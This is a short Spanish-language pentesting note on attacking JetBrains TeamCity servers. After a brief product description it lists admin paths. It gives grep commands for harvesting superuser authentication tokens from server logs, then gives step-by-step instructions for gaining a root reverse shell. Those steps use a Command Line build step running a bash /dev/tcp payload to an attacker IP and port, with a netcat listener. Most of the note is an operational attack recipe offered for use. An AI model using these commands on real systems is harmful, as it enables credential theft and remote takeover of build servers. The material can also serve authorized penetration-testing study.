[[Apuntes]]
## ¿Qué es y cómo funciona?

TeamCity es un servidor de gestión de compilación e integración continua de JetBrains. Se lanzó por primera vez el 2 de octubre de 2006 y es un software comercial con licencia patentada: hay disponibles una licencia freemium para hasta 100 configuraciones de compilación y tres licencias gratuitas de Build Agent.

## Rutas importantes

```
/admin
/admin/admin.html
```

## Encontrar tokens post-explotación

Este cms funciona con usuario y contraseña pero también con tokens, hay muchas veces los cuales podemos encontrarlos en los logs.

Si es el caso que tenemos acceso a los archivos hay varias maneras de encontrarlos


```
grep -rni 'authentication token' TeamCity/logs
grep -rni 'Super user authentication token' TeamCity/logs
grep -rni 'token' TeamCity/logs
O dentro del propio /logs hacer cat * | grep token
```

## Reverse shell

Si obtenemos un login como super user podemos hacer el siguiente proceso para tener una shell como root:

1. Crear un nuevo proyecto en el panel

2. Le damos a **Manual**

3. Una vez creado entramos dentro y le damos a **Build Configuration**

4. Cuando hayamos creado el build configuration salir del mismo e ir a la raiz del proyecto y entonces después darle a **Build Steps a la izquierda del panel**.

5. Add build steps

    1. Runner type --> Command Line

    2. Custom script añadimos una reverse shell --> Ejemplo `bash -c "bash -i >& /dev/tcp/10.18.9.85/4443 0>&1`


6. Nos ponemos en escucha por el puerto 4443 --> `nc -lvnp 4443`

7. Y le damos arriba a la derecha a **Run.**